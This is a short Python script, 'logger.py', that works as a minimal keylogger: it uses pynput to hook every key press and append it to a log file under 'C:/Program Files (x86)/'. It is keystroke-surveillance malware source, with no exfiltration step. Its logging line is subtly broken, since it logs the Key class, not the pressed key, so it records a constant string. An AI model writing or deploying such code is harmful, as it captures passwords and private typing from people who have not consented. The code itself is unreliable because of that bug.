# logger.py
#
# Author: Samuel Berg
# Date: 10-Sep-2019

from pynput.keyboard import Key, Listener
import logging

log_dir = r"C:/Program Files (x86)/"
logging.basicConfig(filename = (log_dir + "logging.txt"), level = logging.DEBUG, format = '%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(Key))
with Listener(on_press = on_press) as listener:
    listener.join()
